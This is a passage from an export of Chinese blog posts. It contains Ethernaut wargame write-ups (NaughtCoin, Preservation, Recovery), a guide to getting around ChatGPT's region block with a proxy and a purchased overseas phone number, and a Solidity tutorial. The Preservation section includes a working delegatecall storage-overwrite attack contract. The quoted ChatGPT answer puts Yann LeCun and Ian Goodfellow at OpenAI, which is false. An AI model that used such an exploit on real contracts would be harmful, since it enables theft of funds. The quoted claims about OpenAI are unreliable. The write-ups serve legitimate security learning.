{}\n}\n\n\n\n\n\n\n\n\n\n注意：\n\n使用solidity0.4.17（或更高版本）的语法\n调用者必须处理false来自returns (bool success). 调用者不得假设false永远不会返回！\n\n函数解析：\n\n构造函数，给令牌名称和符号\n\nconstructor(string memory name_, string memory symbol_) {\n    _name = name_;\n    _symbol = symbol_;\n}\n\n返回令牌的名称 - 例如\"MyToken\"。\n可选 - 此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。\n\n\nfunction name() public view virtual override returns (string memory) {\n    return _name;\n}\n\n返回令牌的符号。例如“HIX”。\n可选 - 此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。\n\n\nfunction symbol() public view virtual override returns (string memory) {\n    return _symbol;\n}\n\n返回令牌使用的小数位数 - 例如8，表示将令牌数量除以100000000得到其用户表示。\n可选 - 此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。\n\n\nfunction decimals() public view virtual override returns (uint8) {\n    return 18;\n}\n\n返回代币总供应量。\n\nfunction totalSupply() public view virtual override returns (uint256) {\n    return _totalSupply;\n}\n\n返回地址为account的另一个帐户的帐户余额。\n\nfunction balanceOf(address account) public view virtual override returns (uint256) {\n    return _balances[account];\n}\n\n将_value令牌数量转移到地址_to，并且必须触发Transfer事件。如果消息调用者的帐户余额没有足够的代币可花费，则该函数应该throw。\n注意 0 值的传输必须被视为正常传输并触发Transfer事件。\n\n\nfunction transfer(address to, uint256 amount) public virtual override returns (bool) {\n    address owner = _msgSender();\n    _transfer(owner, to, amount);\n    return true;\n}\n\n允许_spender多次从您的帐户中提款，最多不超过_value金额。如果再次调用此函数，它会用 覆盖当前的容差_value。\n注意：为了防止像这里描述和讨论的攻击媒介，客户应该确保创建用户界面时，他们首先将允许额度设置为0，然后再为同一支出者将其设置为另一个值。虽然合约本身不应该强制执行它，以允许与之前部署的合约向后兼容\n\n\nfunction approve(address spender, uint256 amount) public virtual override returns (bool) {\n    address owner = _msgSender();\n    _approve(owner, spender, amount);\n    return true;\n}\n\n将amount令牌数量从 address _from转移到 address _to，并且必须触发Transfer事件。\n该transferFrom方法用于撤回工作流程，允许合约代表您转移代币。例如，这可以用于允许合同代表您转移代币和/或以子货币收取费用。该功能应该throw，除非_from帐户通过某种机制故意授权消息的发送者。\n注意 0 值的传输必须被视为正常传输并触发Transfer事件。\n\n\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n    address spender = _msgSender();\n    _spendAllowance(from, spender, amount);\n    _transfer(from, to, amount);\n    return true;\n}\n\nspender返回仍允许从owner中提取的金额。\n\nfunction allowance(address owner, address spender) public view virtual override returns (uint256) {\n    return _allowances[owner][spender];\n}\n随机数题目源码里面有个bolck.timestamp\n\nblock.timestamp表示当前区块何时被挖出来的\nnow表示当前时间戳信息\n\n\n\nblock.coinbase表示挖当前区块的矿工地址\nblock.difficulty表示这个区块的挖矿难度\nblovk.gaslimit表示交易中所限制的最大的gas值\nblock.number表示当前区块的高度\n\n题目要求我们账户代币余额为0\n有个修饰器，要求\n  if (msg.sender == player) {\n    require(block.timestamp &gt; timeLock);\n    _;\n  } else {\n   _;\n  }\n} \n但是因为uint public timeLock = block.timestamp + 10 * 365 days;\n修饰器对transfer函数进行限定，所以要求无法实现\n了解ERC20之后知道转账除了transfer()函数外还有一种方法，就是approve()和transferFrom()结合使用\n\n先调用approve()，允许代表所有者spender花费amount的代币数量。\n\nfunction approve(address spender, uint256 amount) public virtual override returns (bool);\n\n再调用transferFrom()，将批准的令牌amount从所有者from帐户转移到上一步中批准to的地址中。\n\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool);\n\n\n\n\n\n\n\n\n\n\n注意：最后用transferFrom()转账时，要使用被批准账户spender来调用该函数才能成功\noverride:子合约重写了父合约中的函数，需要加上override关键字。\n17.Preservation// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Preservation {\n\n  // public library contracts \n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\n    timeZone1Library = _timeZone1LibraryAddress; \n    timeZone2Library = _timeZone2LibraryAddress; \n    owner = msg.sender;\n  }\n \n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public {\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public {\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n  // stores a timestamp \n  uint storedTime;  \n\n  function setTime(uint _time) public {\n    storedTime = _time;\n  }\n}\n题目要求我们取代成为第一个合约的owner\n\n反编译一手发现owner存储在storage2\n看下能不能尝试改变\n\nPreservation Contract\n\n定义了一些状态变量，其中第一个和第二个变量保存库的地址，第三个变量是我们需要存储地址的所有者。这些地址是在构造函数中预定义的，无法更改。\n\nLibrary Contract\n\n这定义了一个storedTime在 slot 0 中调用的变量，它映射到address public timeZone1Library保存合约中的变量。\n该函数setTime()接受一个由我们控制并存储在上述变量中的输入。\n\n\n分析如何修改owner：\n以合同为例。当Preservation合约执行setTime(100)时，它会通过delegatecall调用LibraryContract.setTime(100)\n如果LibraryContract修改状态，它不会修改自己的状态，而是修改调用者（Preservation）的状态！\n这意味着当LibraryContract.setTime更新storedTime状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的slot0中的变量，即timeZone1Library地址。\n执行setSecondTime函数时会发生同样的事情，它将更新合约slot0中的变量。Preservation\n攻击合约\ncontract delegateHack{\n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner;\n\n  Preservation add;\n\n  constructor(address _addr) public {\n      add=Preservation(_addr);\n  }\n\n  function exploit() external{\n    add.setFirstTime(uint256(uint160(address(this))));\n    add.setFirstTime(uint256(uint160(msg.sender)));\n    require(add.owner()==msg.sender,\"hack failed\");\n    }\n\n  function setTime(uint _owner) public {\n      owner = address(uint160(_owner));\n    }\n}\n最后那个setTime函数一开始写成这样是错的：\nfunction setTime(address _owner) public{\n  owner = _owner;\n}\n可能是因为和源码的不一样导致owner的地址一直无法改变\n部署一下使用exploit函数即可\n\n18.Recoverycreate和create2（在之前写的solidity进阶里面有）在合约中创建新合约\n\n以太坊合约的地址计算（https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761）以太坊合约的地址是根据其创建者的地址 ( ) 和创建者发送的交易数量 ( )确定性计算的。 The sender and nonce are RLP encoded and then hashed with Keccak-256.\n在solidity中：\n//  nonce 为 0 时生成的地址\nnonce0= \naddress(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x80))))));\nnonce1= address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _origin, bytes1(0x01))))));\n\n\n\n\n\n\n\n\n\n注意：在这题中\n\n发送者_origin是Recover合约本身\nnonce 是合约本身创建的合约编号。需要记住的重要一点：合约的随机数从 1 而不是 0 开始！\n\ncontract locate{\n  address public lostaddr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0xe28517966fff65C678F1393b121ABF262A7Df53D\n), bytes1(0x01))))));\n}\n\n\n\n\n\n\n\n\n\n注意：address(0xe28517966fff65C678F1393b121ABF262A7Df53D\n)是本题中的发送者。\n\n得到的这个地址把他拿到区块链浏览器上看看来源\n\n\n确定是丢失的地址\n部署该地址的Recover合约，并且调用selfdestruct函数把钱转走就完成了\n\n","slug":"Ethernaut题解","date":"2023-03-24T15:30:12.000Z","categories_index":"","tags_index":"solidity靶场","author_index":"cocoZ"},{"id":"462812fbbc64f9c8b5d4c209bcb7fd5a","title":"ChatGPT的搭建","content":"什么是ChatGPT\n\n\n\n\n\n\n\n\n 我是 Assistant，一个由 OpenAI 训练的大型语言模型。我可以回答您的问题，并帮助您了解更多关于特定主题的信息。我并不具备自己的意识，只能通过我所学到的知识来回答问题。如果您有任何其他问题，请随时问我。我很乐意帮助您。\n —ChatGPT\n什么是OpenAI\n\n\n\n\n\n\n\n\nOpenAI是一家人工智能研究机构，致力于通过研究人工智能技术来推进人类的发展。它由一群来自业界和学术界的研究人员和专家组成，包括伯克利加州大学的 Yann LeCun 和加州理工学院的 Ian Goodfellow 等。OpenAI的目标是通过开发智能系统来提高人类生活的质量，并帮助人类应对未来的挑战。它已经开发了许多不同的人工智能技术，其中包括机器翻译、自然语言处理、图像分类和语音识别等。OpenAI还与其他研究机构和企业合作，共同开发更多的人工智能技术。\n—ChatGPT\n如何注册ChatGPT\n首先要在设备上开启全局代理\n\n访问ChatGPT登录页开始注册（https://openai.com/blog/chatgpt）\n\n根据屏幕指示操作后需要手机号验证\n在这里ChatGPT不支持China，所以需要买一个海外的手机号\nhttps://sms-activate.org/\n\n\n\n注册该网站的账号后使用支付宝充值2美元之后，在左侧搜索框输入OpenAI\n\n买一个手机号\n\n刚开始买了印度尼西亚的手机号收不到验证码，后来买了个美国的号码就ok了，输入验证码就注册成功\n\n\nChatGPT for Google插件\n搜索ChatGPT for Google之后添加到插件\n\n\n谷歌搜索的右侧就会出现ChatGPT的答案\n参考文章https://zblogs.top/how-to-register-openai-chatgpt-in-china/\n","slug":"ChatGPT","date":"2023-03-20T04:15:54.000Z","categories_index":"","tags_index":"ChatGPT","author_index":"cocoZ"},{"id":"26cdbf141378457625c3c7f264148e8f","title":"solidity进阶","content":"solidity进阶16.函数重载重载solidity中允许函数进行重载（overloading），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，solidity不允许修饰器（modifier）重载。\n函数重载举个例子，我们可以定义两个都叫saySomething()的函数，一个没有任何参数，输出\"Nothing\"；另一个接收一个string参数，输出这个string。\nfunction saySomething() public pure returns(string memory){\n    return(\"Nothing\");\n}\n\nfunction saySomething(string memory something) public pure returns(string memory){\n    return(something);\n}\n最终重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）。(选择器在29的内容)\n实参匹配（Argument Matching）在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫f()的函数，一个参数为uint8，另一个为uint256：\nfunction f(uint8 _in) public pure returns (uint8 out) {\n    out = _in;\n}\n\nfunction f(uint256 _in) public pure returns (uint256 out) {\n    out = _in;\n}\n我们调用f(50)，因为50既可以被转换为uint8，也可以被转换为uint256，因此会报错。\n17.库合约库函数库函数是一种特殊的合约，为了提升solidity代码的复用性和减少gas而存在。库合约一般都是一些好用的函数合集（库函数），由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。\n库函数和普通合约的不同：1.不能存在状态变量2.不能够继承或被继承3.不能接受以太币4.不可以被销毁\nString库合约String库合约是将uint256类型转换为相应的string类型的代码库，样例代码如下：\nlibrary Strings {\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) public pure returns (string memory) {\n        // Inspired by OraclizeAPI's implementation - MIT licence\n        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\n\n        if (value == 0) {\n            return \"0\";\n        }\n        uint256 temp = value;\n        uint256 digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) public pure returns (string memory) {\n        if (value == 0) {\n            return \"0x00\";\n        }\n        uint256 temp = value;\n        uint256 length = 0;\n        while (temp != 0) {\n            length++;\n            temp &gt;&gt;= 8;\n        }\n        return toHexString(value, length);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) public pure returns (string memory) {\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i &gt; 1; --i) {\n            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];\n            value &gt;&gt;= 4;\n        }\n        require(value == 0, \"Strings: hex length insufficient\");\n        return string(buffer);\n    }\n}\n他主要包含两个函数，toString()将uint256转为string，toHexString()将uint256转换为16进制，在转换为string。\n如何使用库合约1.利用using for指令\n指令using A for B;可用于附加库函数（从库 A）到任何类型（B）。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数：\n// 利用using for指令\nusing Strings for uint256;\nfunction getString1(uint256 _number) public pure returns(string memory){\n    // 库函数会自动添加为uint256型变量的成员\n    return _number.toHexString();\n}\n2.通过库合约名称调用库函数\n// 直接通过库合约名调用\nfunction getString2(uint256 _number) public pure returns(string memory){\n    return Strings.toHexString(_number);\n}\n\nString：将uint256转换为String\nAddress：判断某个地址是否为合约地址\nCreate2：更安全的使用Create2 EVM opcode\nArrays：跟数组相关的库函数\n\n18.Importsolidity支持利用import关键字导入其他源代码中的合约，让开发更加模块化。\nimport用法\n通过源文件相对位置导入，eg：\n\n文件结构\n├── Import.sol\n└── Yeye.sol\n\n// 通过文件相对位置import\nimport './Yeye.sol';\n\n通过源文件网址导入网上的合约，eg：\n\n// 通过网址引用\nimport 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol';\n\n通过npm的目录导入，eg：\n\nimport '@openzeppelin/contracts/access/Ownable.sol';\n\n通过全局符号导入特定的合约，eg：\n\nimport {Yeye} from './Yeye.sol';\n\n引用(import)在代码中的位置为：在声明版本号之后，在其余代码之前。\n\n19.接受ETHSolidity支持两种特殊的回调函数，receive()和fallback()，他们主要在两种情况下被使用：\n\n接收ETH\n处理合约中不存在的函数调用（代理合约proxy contract）\n\n注意⚠️：在solidity 0.6.x版本之前，语法上只有 fallback() 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，solidity才将 fallback() 函数拆分成 receive() 和 fallback() 两个函数。\n接受ETH函数receivereceive()只用于处理接收ETH。一个合约最多有一个receive()函数，声明方式与一般函数不一样，不需要function关键字：receive() external payable { ... }。receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable。\n当合约接收ETH的时候，receive()会被触发。receive()最好不要执行太多的逻辑因为如果别人用send和transfer方法发送ETH的话，gas会限制在2300，receive()太复杂可能会触发Out of Gas报错；如果用call就可以自定义gas执行更复杂的逻辑（这三种发送ETH的方法我们之后会讲到）。\n可以在receive()里发送一个event，eg：\n// 定义事件\nevent Received(address Sender, uint Value);\n// 接收ETH时释放Received事件\nreceive() external payable {\n    emit Received(msg.sender, msg.value);\n}\n有些恶意合约，会在receive() 函数（老版本的话，就是 fallback() 函数）嵌入恶意消耗gas的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。\n回退函数fallbackfallback()函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约proxy contract。fallback()声明时不需要function关键字，必须由external修饰，一般也会用payable修饰，用于接收ETH:fallback() external payable { ... }。\n我们定义一个fallback()函数，被触发时候会释放fallbackCalled事件，并输出msg.sender，msg.value和msg.data:\n// fallback\nfallback() external payable{\n    emit fallbackCalled(msg.sender, msg.value, msg.data);\n}\nreceive和fallback的区别receive和fallback都能够用于接收ETH，他们触发的规则如下：\n触发fallback() 还是 receive()?\n           接收ETH\n              |\n         msg.data是空？\n            /  \\\n          是    否\n          /      \\\nreceive()存在?   fallback()\n        / \\\n       是  否\n      /     \\\nreceive()   fallback()\n简单来说，合约接收ETH时，msg.data为空且存在receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable。\nreceive()和payable fallback()均不存在的时候，向合约发送ETH将会报错。\n20.发送ETH接受ETH合约我们先部署一个接收ETH合约ReceiveETH。ReceiveETH合约里有一个事件Log，记录收到的ETH数量和gas剩余。还有两个函数，一个是receive()函数，收到ETH被触发，并发送Log事件；另一个是查询合约ETH余额的getBalance()函数。\ncontract ReceiveETH {\n    // 收到eth事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    // receive方法，接收eth时被触发\n    receive() external payable{\n        emit Log(msg.value, gasleft());\n    }\n    \n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n部署ReceiveETH合约后，运行getBalance()函数，可以看到当前合约的ETH余额为0。\n发送ETH合约我们将实现三种方法向ReceiveETH合约发送ETH。首先，先在发送ETH合约SendETH中实现payable的构造函数和receive()，让我们能够在部署时和部署后向合约转账。\ncontract SendETH {\n    // 构造函数，payable使得部署的时候可以转eth进去\n    constructor() payable{}\n    // receive方法，接收eth时被触发\n    receive() external payable{}\n}\ntransfer\n用法是接收方地址.transfer(发送ETH数额)。\ntransfer()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。\ntransfer()如果转账失败，会自动revert（回滚交易）。\n\n代码样例，注意里面的_to填ReceiveETH合约的地址，amount是ETH转账金额：\n// 用transfer()发送ETH\nfunction transferETH(address payable _to, uint256 amount) external payable{\n    _to.transfer(amount);\n}\nsend\n用法是接收方地址.send(发送ETH数额)。\nsend()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。\nsend()如果转账失败，不会revert。\nsend()的返回值是bool，代表着转账成功或失败，需要额外代码处理一下。\n\n代码样例：\n// send()发送ETH\nfunction sendETH(address payable _to, uint256 amount) external payable{\n    // 处理下send的返回值，如果失败，revert交易并发送error\n    bool success = _to.send(amount);\n    if(!success){\n        revert SendFailed();\n    }\n}\ncall\n用法是接收方地址.call{value: 发送ETH数额}(\"\")。\ncall()没有gas限制，可以支持对方合约fallback()或receive()函数实现复杂逻辑。\ncall()如果转账失败，不会revert。\ncall()的返回值是(bool, data)，其中bool代表着转账成功或失败，需要额外代码处理一下。\n\n代码样例：\n// call()发送ETH\nfunction callETH(address payable _to, uint256 amount) external payable{\n    // 处理下call的返回值，如果失败，revert交易并发送error\n    (bool success,) = _to.call{value: amount}(\"\");\n    if(!success){\n        revert CallFailed();\n    }\n}\n三者的选择\ncall没有gas限制，最为灵活，是最提倡的方法；\ntransfer有2300 gas限制，但是发送失败会自动revert交易，是次优选择；\nsend有2300 gas限制，而且发送失败不会自动revert交易，几乎没有人用它。\n\n21.调用其他合约调用已部署合约\n开发者写智能合约来调用其他合约，这让以太坊网络上的程序可以复用，从而建立繁荣的生态。很多web3项目依赖于调用其他合约，比如收益农场（yield farming）。这一讲，我们介绍如何在已知合约代码（或接口）和地址情况下调用目标合约的函数。\n目标合约先写一个简单的合约OtherContract来调用。\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量_x\n    // 收到eth的事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取_x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n这个合约包含一个状态变量_x，一个事件Log在收到ETH时触发，三个函数：\n\ngetBalance(): 返回合约ETH余额。\nsetX(): external payable函数，可以设置_x的值，并向合约发送ETH。\ngetX(): 读取_x的值。\n\n调用OtherContract合约（先贴个源码吧，本来以为要创建两个文件的，只要一个文件部署两个合约就可以了）\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量x\n    // 收到eth事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\ncontract CallContract{\n    function callSetX(address _Address, uint256 x) external{\n        OtherContract(_Address).setX(x);\n    }\n\n    function callGetX(OtherContract _Address) external view returns(uint x){\n        x = _Address.getX();\n    }\n\n    function callGetX2(address _Address) external view returns(uint x){\n        OtherContract oc = OtherContract(_Address);\n        x = oc.getX();\n    }\n\n    function setXTransferETH(address otherContract, uint256 x) payable external{\n        OtherContract(otherContract).setX{value: msg.value}(x);\n    }\n}\n我们可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。\n下面我们介绍4个调用合约的例子，在remix中编译合约后，分别部署OtherContract和CallContract：(还没怎么搞得懂)\n1.传入合约地址我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，传入已部署好的OtherContract合约地址_Address和setX的参数x：\nfunction callSetX(address _Address, uint256 x) external{\n    OtherContract(_Address).setX(x);\n}\n复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123\n2.传入合约变量我们可以直接在函数里传入合约的引用，只需要把上面参数的address类型改为目标合约名，比如OtherContract。下面例子实现了调用目标合约的getX()函数。\n注意该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型\nfunction callGetX(OtherContract _Address) external view returns(uint x){\n    x = _Address.getX();\n}\n复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值\n3.创建合约变量我们可以创建合约变量，然后通过它来调用目标函数。下面例子，我们给变量oc存储了OtherContract合约的引用：\nfunction callGetX2(address _Address) external view returns(uint x){\n    OtherContract oc = OtherContract(_Address);\n    x = oc.getX();\n}\n复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值\n4.调用合约并发送ETH如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：_Name(_Address).f{value: _Value}()，其中_Name是合约名，_Address是合约地址，f是目标函数名，_Value是要转的ETH数额（以wei为单位）。\nOtherContract合约的setX函数是payable的，在下面这个例子中我们通过调用setX来往目标合约转账。\nfunction setXTransferETH(address otherContract, uint256 x) payable external{\n    OtherContract(otherContract).setX{value: msg.value}(x);\n}\n复制OtherContract合约的地址，填入setXTransferETH函数的参数中，并转入10ETH\n转账后，我们可以通过Log事件和getBalance()函数观察目标合约ETH余额的变化。\n22.Callcall 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为(bool, data)，分别对应call是否成功以及目标函数的返回值。\n\ncall是solidity官方推荐的通过触发fallback或receive函数发送ETH的方法。\n不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数，见第21讲：调用其他合约\n当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数。\n\ncall的使用规则目标合约地址.call(二进制编码);\n其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：\nabi.encodeWithSignature(\"函数签名\", 逗号分隔的具体参数)\n函数签名为\"函数名（逗号分隔的参数类型)\"。例如abi.encodeWithSignature(\"f(uint256,address)\", _x, _addr)。\n另外call在调用合约时可以指定交易发送的ETH数额和gas：\n目标合约地址.call{value:发送数额, gas:gas数额}(二进制编码);\n(看不懂……举个栗子康康)\n目标合约先写一个简单的目标合约OtherContract并部署，代码与第19讲中基本相同，只是多了fallback函数。\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量x\n    // 收到eth的事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    fallback() external payable{}\n\n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n这个合约包含一个状态变量x，一个在收到ETH时触发的事件Log，三个函数：\n\ngetBalance(): 返回合约ETH余额。\nsetX(): external payable函数，可以设置x的值，并向合约发送ETH。\ngetX(): 读取x的值。\n\n利用call调用目标合约1.Response事件\n我们写一个Call合约来调用目标合约函数。首先定义一个Response事件，输出call返回的success和data，方便我们观察返回值。\n// 定义Response事件，输出call返回的结果success和data\nevent Response(bool success, bytes data);\n2.调用setX函数\n我们定义callSetX函数来调用目标合约的setX()，转入msg.value数额的ETH，并释放Response事件输出success和data：\nfunction callSetX(address payable _addr, uint256 x) public payable {\n    // call setX()，同时可以发送ETH\n    (bool success, bytes memory data) = _addr.call{value: msg.value}(\n        abi.encodeWithSignature(\"setX(uint256)\", x)\n    );\n\n    emit Response(success, data); //释放事件\n}\n接下来我们调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。\n3.调用getX函数\n下面我们调用getX()函数，它将返回目标合约_x的值，类型为uint256。我们可以利用abi.decode来解码call的返回值data，并读出数值。\nfunction callGetX(address _addr) external returns(uint256){\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"getX()\")\n    );\n\n    emit Response(success, data); //释放事件\n    return abi.decode(data, (uint256));\n}\n从Response事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过abi.decode，最终返回值为5。\n4.调用不存在的函数\n如果我们给call输入的函数不存在于目标合约，那么目标合约的fallback函数会被触发。\nfunction callNonExist(address _addr) external{\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"foo(uint256)\")\n    );\n\n    emit Response(success, data); //释放事件\n}\n上面例子中，我们call了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数。\ncall不是调用合约的推荐方法，因为不安全。但他能让我们在不知道源代码和ABI的情况下调用目标合约，很有用。\n(最后直接贴上所有代码)\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OtherContract {\n    uint256 private _x = 0; // 状态变量x\n    // 收到eth的事件，记录amount和gas\n    event Log(uint amount, uint gas);\n    \n    fallback() external payable{}\n\n    // 返回合约ETH余额\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n\n    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)\n    function setX(uint256 x) external payable{\n        _x = x;\n        // 如果转入ETH，则释放Log事件\n        if(msg.value &gt; 0){\n            emit Log(msg.value, gasleft());\n        }\n    }\n\n    // 读取x\n    function getX() external view returns(uint x){\n        x = _x;\n    }\n}\n\n    contract call{\n        function callGetX(address _addr) external returns(uint256){\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"getX()\")\n    );\n\n    emit Response(success, data); //释放事件\n    return abi.decode(data, (uint256));\n}\n\n        event Response(bool success, bytes data);\n\n        function callSetX(address payable _addr, uint256 x) public payable {\n    // call setX()，同时可以发送ETH\n    (bool success, bytes memory data) = _addr.call{value: msg.value}(\n        abi.encodeWithSignature(\"setX(uint256)\", x)\n    );\n\n    emit Response(success, data); //释放事件\n}\n    function callNonExist(address _addr) external{\n    // call getX()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"foo(uint256)\")\n    );\n\n    emit Response(success, data); //释放事件\n}\n    }\n23.Delegatecalldelegatecall与call类似，是solidity中地址类型的低级成员函数。delegate中是委托/代表的意思，那么delegatecall委托了什么？\n当用户A通过合约B来call合约C的时候，执行的是合约C的函数，语境(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。\n而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是语境仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。\n大家可以这样理解：一个富商把它的资产（状态变量）都交给一个VC代理（目标合约的函数）来打理。执行的是VC的函数，但是改变的是富商的状态。\ndelegatecall语法和call类似，也是：\n目标合约地址.delegatecall(二进制编码);\n其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：\nabi.encodeWithSignature(\"函数签名\", 逗号分隔的具体参数)\n函数签名为\"函数名（逗号分隔的参数类型)\"。例如abi.encodeWithSignature(\"f(uint256,address)\", _x, _addr)。\n和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额\n\n\n\n\n\n\n\n\n\n注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。\n什么情况下会用到delegatecall目前delegatecall主要有两个应用场景：\n\n代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行。当升级时，只需要将代理合约指向新的逻辑合约即可。\nEIP-2535 